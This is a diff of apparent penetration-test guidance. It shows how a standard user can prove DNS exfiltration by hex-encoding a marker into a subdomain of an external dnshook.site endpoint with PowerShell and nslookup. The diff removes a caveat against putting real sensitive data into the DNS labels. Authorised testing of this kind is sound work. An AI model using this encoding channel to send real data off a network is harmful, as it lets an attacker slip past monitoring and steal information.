@@ -1,4 +1,26 @@
-nd DNS queries.
+Your unique DNS name in the screenshot is:
+51145084-1a01-4e79-a2bd-076310230a6f.dnshook.site
+
+Start with a simple connectivity test from the SOE:
+Resolve-DnsName "ionize-test.51145084-1a01-4e79-a2bd-076310230a6f.dnshook.site"
+
+or:
+nslookup ionize-test.51145084-1a01-4e79-a2bd-076310230a6f.dnshook.site
+
+Then refresh Webhook.site. If you see ionize-test... arrive, you've proven that a standard user can cause an arbitrary DNS query to an external domain.
+For a slightly stronger but still completely benign proof, encode a harmless marker into the subdomain. In PowerShell:
+$marker = "IONIZE-TEST-12OCT2026"
+$hex = -join ([System.Text.Encoding]::UTF8.GetBytes($marker) | ForEach-Object { $_.ToString("x2") })
+
+$domain = "$hex.51145084-1a01-4e79-a2bd-076310230a6f.dnshook.site"
+
+Write-Host $domain
+Resolve-DnsName $domain
+
+You should get something resembling:
+494f4e495a452d544553542d31324f435432303236.51145084-1a01-4e79-a2bd-076310230a6f.dnshook.site
+
+Then check the DNSHook inbox. If that exact hostname appears, you have clean evidence that user-controlled data can be encoded into outbound DNS queries.
 For your screenshot/evidence, I'd capture both windows if possible:
 SOE:
 whoami
@@ -9,5 +31,3 @@ received DNS request showing the same encoded marker
 
 I would describe the outcome as:
 DNS data transfer capability: CONFIRMED. A standard user was able to generate an external DNS request containing attacker-controlled encoded data within the queried hostname, which was successfully observed by an externally controlled DNS endpoint.
-
-One nuance: this demonstrates the channel exists, not that sensitive data was actually exfiltrated. That's enough for the test; don't put any real ASIC information into the DNS label.
